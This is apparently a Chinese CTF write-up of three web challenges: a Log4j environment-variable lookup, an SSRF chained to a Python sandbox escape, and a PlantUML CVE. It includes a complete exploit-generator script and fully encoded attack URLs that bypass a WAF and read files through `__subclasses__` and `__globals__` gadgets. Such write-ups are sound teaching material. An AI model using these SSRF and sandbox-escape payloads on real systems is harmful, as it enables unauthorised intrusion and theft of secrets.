
# chatrobot

拿到项目展开后，先扫一眼，发现了几个关键的地方

1.app.py
2.log4j
3.chatrobot的jar包

我们想到项目可能是java外面套着一层py

第一反应打的是log4j那个cve，但一查这个版本好像修了

我们看看app.py
发现几个关键点
真flag被赋给了环境变量FLAG
把cmd当作系统属性传进java运行环境中了，把text当成命令传进去。

其实看到这里我们可以猜到，我们需要想办法读环境变量
![[Pasted image 20251206221904.png]]
我们接着看看配置文件log4j2.xml
一下就明了了，log4j在初始化的时候会解析cmd这个系统属性，那我们同理可以想办法让他，解析拿到环境变量

![[Pasted image 20251206222620.png]]
那我们最后剩下的问题就是我们怎么看到这个日志，想办法带出来

看看java的业务逻辑
看到这更加确信了我们的想法，肯定是想办法读环境变量。
并且看到下面，我们发现他
```java
LOGGER.info("msg: {}", args);
```
并且这里把日志打印出来了！
那我们利用链很明显了，通过cmd传参一个可以读环境变量的payload
并且在日志模板中解析cmd参数，把环境变量嵌入日志模板，并在业务逻辑中输出。
![[Pasted image 20251206224156.png]]

payload如下：
![[Pasted image 20251206225300.png]]


ps：这里犯了一个很傻的小错误（恨自己基础太差了）
最开始没有怎么读根路由的逻辑，只看到了/chat的传参，所以一直在`/chat?cmd=${env:FLAG}&arg=`
后来实在卡住了就一直跟ai问，最后还是靠ai唉。。
![[Pasted image 20251206225603.png]]
原来这里的标准错误根本就没输出，所以我才看不到。。


---



# check_in

逻辑都在app.py里
代码执行漏洞点在这，但是前面必须要本地访问，所以只能ssrf
![[Pasted image 20251207003601.png]]
正好搭配这里，除了不让跳转都没有限制，直接ssrf
此时我们思路明确，从/fetch ssrf到`/__internal/safe_eval`调用危险方法返回到/fetch带出


![[Pasted image 20251207003711.png]]
看waf逻辑
ban了数字字母
但这个{3}一眼道破了    url编码
![[Pasted image 20251207003812.png]]![[Pasted image 20251207004152.png]]
查头：直接用url经典绕过
`http://user:pass@host:port/`
![[Pasted image 20251207004245.png]]
下面就是怎么绕沙箱了

![[Pasted image 20251207004631.png]]
当时ai直接秒给我exp了。。
```python
def generate_number(n):  
    """  
    使用 1, 0, -, space 构造任意数字  
    例如 2 => 1- -1    """    if n == 0: return "0"  
    if n == 1: return "1"  
  
    res = "1"  
    for _ in range(n - 1):  
        res += "- -1"  
    return res  
  
  
def generate_string(s):  
    """  
    使用 lit(dic(string=1)).pop() 构造字符串  
    注意：这种方法只能构造符合变量命名规范的字符串（无特殊字符，无开头数字）    对于 'flag', 'open', '__builtins__' 都有效。  
    """    return f"lit(dic({s}=1)).pop()"  
# 构造 'flag' 字符串  
str_flag = generate_string("flag")  
# 构造 'open' 字符串  
str_open = generate_string("open")  
# 构造 '__builtins__' 字符串  
str_builtins = generate_string("__builtins__")  
  
# 核心 Payload 模板  
# 我们需要遍历 subclasses 寻找一个合适的类。  
# 这里为了脚本通用性，我们先发起一次请求获取 subclasses 列表（如果长度允许），  
# 或者直接使用一个很长的 Payload 动态寻找（太长会被长度限制拦截）。  
# 鉴于长度限制 strict (约300字符)，我们最好先本地测试或手动探测索引。  
# 假设我们探测索引。  
  
# 这是一个通用的探测 Payload，用于寻找含有 os 模块引用的类  
# 但由于长度限制，我们直接硬编码尝试利用。  
# 常用 gadget: warnings.catch_warnings  
# 手动探测索引的简易 Payload (用于查看环境中的类):  
# payload_str = "lit.__base__.__subclasses__()"  
  
# 实际攻击 Payload：  
# 假设索引 130 左右通常有 os._wrap_close，或者 catch_warnings# 下面的 index 需要根据回显调整，或者写个循环爆破  
  
target_class_index = 127  # 这是一个猜测值，通常在 80-200 之间  
  
# 构造数字索引  
idx_payload = generate_number(target_class_index)  
  
# 组合 Payload# 1. 获取子类列表: s = lit.__base__.__subclasses__()  
# 2. 获取特定类: c = s.__getitem__(idx)  
# 3. 获取 globals: g = c.__init__.__globals__# 4. 获取 builtins: b = g.get(str_builtins)# 5. 获取 open: o = b.get(str_open)# 6. 读取: o(str_flag).read()  
  
# 压缩代码长度  
# lit.__base__.__subclasses__().__getitem__(IDX).__init__.__globals__.get(KEY_BUILTINS).get(KEY_OPEN)(ARG_FLAG).read()  
  
final_payload = (  
    f"lit.__base__.__subclasses__().__getitem__({idx_payload})"  
    f".__init__.__globals__.get({str_builtins})"  
    f".get({str_open})({str_flag}).read()"  
)  
  
# 如果长度超限，我们可以利用 pop() 简化:  
# 例如 list 倒数几个类通常有用，可以用 .pop()# final_payload = f"lit.__base__.__subclasses__().pop()..__init__..."  
  
print(f"[*] Payload Length: {len(final_payload)}")  
if len(final_payload) > 300:  
    print("[!] Payload too long! Trying to optimize...")  
    # 优化策略：不使用 generate_number 构造大数，而是寻找靠前的类或者使用 pop()    # 这里演示使用 pop() 访问倒数第一个类 (通常是 os._wrap_close)    final_payload = (  
        f"lit.__base__.__subclasses__().pop()"  # 取最后一个类  
        f".__init__.__globals__.get({str_builtins})"  
        f".get({str_open})({str_flag}).read()"  
    )  
    print(f"[*] Optimized Payload Length: {len(final_payload)}")  
  
# URL Encode payload (绕过 general_waf 的 [char]{3} 检查)  
# 这里的关键是 urllib.parse.quote 会把每个字符转为 %xx# 从而打断连续字符  
encoded_payload = "".join(f"%{hex(ord(c))[2:].zfill(2)}" for c in final_payload)  
  
# 构造 SSRF URL# 利用 user:pass@host 格式欺骗 parser# http://vnctf.com@localhost:8080/__internal/safe_eval?hi=<payload>  
target_ssrf = f"http://vnctf.com@localhost:8080/__internal/safe_eval?hi={encoded_payload}"  
print(target_ssrf)  
print(f"[*] Payload Length: {len(final_payload)}")
```

`http://vnctf.com@localhost:8080/__internal/safe_eval?hi=%6c%69%74%2e%5f%5f%62%61%73%65%5f%5f%2e%5f%5f%73%75%62%63%6c%61%73%73%65%73%5f%5f%28%29%2e%70%6f%70%28%29%2e%5f%5f%69%6e%69%74%5f%5f%2e%5f%5f%67%6c%6f%62%61%6c%73%5f%5f%2e%67%65%74%28%6c%69%74%28%64%69%63%28%5f%5f%62%75%69%6c%74%69%6e%73%5f%5f%3d%31%29%29%2e%70%6f%70%28%29%29%2e%67%65%74%28%6c%69%74%28%64%69%63%28%6f%70%65%6e%3d%31%29%29%2e%70%6f%70%28%29%29%28%6c%69%74%28%64%69%63%28%66%6c%61%67%3d%31%29%29%2e%70%6f%70%28%29%29%2e%72%65%61%64%28%29`

这是我们`/fetch?url=`url的传参，会被上面的waf拦下来，所以我们url编码一次
先在`/fetch`中被解码一次，ssrf到`/__internal/safe_eval`再解码一次
完美

最终payload如下：
`http://challenge.ilovectf.cn:30798/fetch?url=%68%74%74%70%3a%2f%2f%76%6e%63%74%66%2e%63%6f%6d%40%6c%6f%63%61%6c%68%6f%73%74%3a%38%30%38%30%2f%5f%5f%69%6e%74%65%72%6e%61%6c%2f%73%61%66%65%5f%65%76%61%6c%3f%68%69%3d%25%36%63%25%36%39%25%37%34%25%32%65%25%35%66%25%35%66%25%36%32%25%36%31%25%37%33%25%36%35%25%35%66%25%35%66%25%32%65%25%35%66%25%35%66%25%37%33%25%37%35%25%36%32%25%36%33%25%36%63%25%36%31%25%37%33%25%37%33%25%36%35%25%37%33%25%35%66%25%35%66%25%32%38%25%32%39%25%32%65%25%37%30%25%36%66%25%37%30%25%32%38%25%32%39%25%32%65%25%35%66%25%35%66%25%36%39%25%36%65%25%36%39%25%37%34%25%35%66%25%35%66%25%32%65%25%35%66%25%35%66%25%36%37%25%36%63%25%36%66%25%36%32%25%36%31%25%36%63%25%37%33%25%35%66%25%35%66%25%32%65%25%36%37%25%36%35%25%37%34%25%32%38%25%36%63%25%36%39%25%37%34%25%32%38%25%36%34%25%36%39%25%36%33%25%32%38%25%35%66%25%35%66%25%36%32%25%37%35%25%36%39%25%36%63%25%37%34%25%36%39%25%36%65%25%37%33%25%35%66%25%35%66%25%33%64%25%33%31%25%32%39%25%32%39%25%32%65%25%37%30%25%36%66%25%37%30%25%32%38%25%32%39%25%32%39%25%32%65%25%36%37%25%36%35%25%37%34%25%32%38%25%36%63%25%36%39%25%37%34%25%32%38%25%36%34%25%36%39%25%36%33%25%32%38%25%36%66%25%37%30%25%36%35%25%36%65%25%33%64%25%33%31%25%32%39%25%32%39%25%32%65%25%37%30%25%36%66%25%37%30%25%32%38%25%32%39%25%32%39%25%32%38%25%36%63%25%36%39%25%37%34%25%32%38%25%36%34%25%36%39%25%36%33%25%32%38%25%36%36%25%36%63%25%36%31%25%36%37%25%33%64%25%33%31%25%32%39%25%32%39%25%32%65%25%37%30%25%36%66%25%37%30%25%32%38%25%32%39%25%32%39%25%32%65%25%37%32%25%36%35%25%36%31%25%36%34%25%32%38%25%32%39%0a`

![[Pasted image 20251207003308.png]]
下面我们来学习下ai的沙箱逃逸

**限制条件**:

1. 只允许来自 `127.0.0.1` 的请求（通过 SSRF 解决）。
    
2. **黑名单**: `\x`, `+`, `join`, `"`, `'`, `[`, `]`, `2`-`9`。这意味着我们不能用引号定义字符串，不能用中括号索引列表/字典，不能用大于1的数字。
    
3. **Globals**: 只有 `lit` (即 `list`) 和 `dic` (即 `dict`)。`__builtins__` 被置为 `None`。
    

**绕过思路**:

1. **构造字符串 (No Quotes)**:
    
    - 虽然不能用引号，但我们可以通过 `dict` 的键名来获取字符串。
        
    - Payload: `lit(dic(flag=1)).pop()`
        
        - `dic(flag=1)` 生成 `{'flag': 1}`。
            
        - `lit(...)` 转换成 `['flag']`。
            
        - `.pop()` 取出 `'flag'` 字符串。
            
2. **构造数字 (No 2-9)**:
    
    - 可以使用减法和负数。
        
    - Payload: `1- -1` (等于 2), `1- -1- -1` (等于 3)。
        
3. **列表索引 (No `[]`)**:
    
    - 不能用 `list[0]`，但可以用魔法方法 `__getitem__`。
        
    - Payload: `somelist.__getitem__(0)`。


之前记过
![[Pasted image 20251207011114.png]]



4. **恢复执行能力 (RCE)**:
    
    - 目标是获取 `open` 或 `os` 模块。
        
    - 利用链: `类` -> `基类 (object)` -> `子类列表` -> `某个加载了os的类` -> `__init__` -> `__globals__` -> `__builtins__` -> `open`。


ai帮我们写好的脚本，我们想办法自己复现一遍

先拿父类
![[Pasted image 20251207011726.png]]



用之前找父类的小脚本![[Pasted image 20251207012314.png]]
得到利用链

`{{list.__class__.__base__.__subclasses__().pop().__init__.__globals__['__builtins__']['open']('flag').read()}}`
把其中带引号的字符串通过`(lit(dic(字符串=1))`取出

得到payload，编码上传
`http://challenge.ilovectf.cn:30798/fetch?url=http://vnctf.com@localhost:8080/__internal/safe_eval?hi=lit.__base__.__subclasses__().pop().__init__.__globals__.get(lit(dic(__builtins__=1)).pop()).get(lit(dic(open=1)).pop())(lit(dic(flag=1)).pop()).read()
`

---
# notebook

一个markdown记事本![[Pasted image 20251207013543.png]]
先看看有啥能利用的？
最开始看到这个链接代码块，感觉能ssrf，但是除了http（s）测试都用不了，不了了之了

还发现了xss
但是显然这都没个登录页面啊唉
xss钓鱼可能性不大吧。。


![[Pasted image 20251207014043.png]]

因为这种能xss 他肯定是前端有一些问题，看看js
哥们我终于找到能和后端交互的地方了
发现是这个生成图标的地方可以和后端交互

![[Pasted image 20251207014337.png]]
ok这里到我最疑惑的时候了。。。

我一直不懂为啥代码格式不支持。。？
上网找这个PlantUML的时候找到CVE了。。
![[Pasted image 20251207014628.png]]
就粘了CVE的payload试试
![[Pasted image 20251207014823.png]]
![[Pasted image 20251207014920.png]]
就出了。。

![[Pasted image 20251207014957.png]]
![[Pasted image 20251207015009.png]]
